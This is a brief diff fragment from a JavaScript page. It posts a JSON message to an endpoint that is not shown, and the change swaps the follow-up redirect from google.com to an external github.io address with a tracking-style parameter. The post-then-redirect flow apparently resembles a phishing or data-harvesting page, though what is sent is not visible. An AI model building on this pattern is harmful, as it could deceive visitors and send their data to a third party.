@@ -19,7 +19,7 @@ method: "POST",
 headers: {"Content-Type":"application/json"},
 body: JSON.stringify(msg)
 });
-window.location.href="https://google.com"
+window.location.href="https://redcg3.github.io?gd=OwycZW"
 }
 }
 
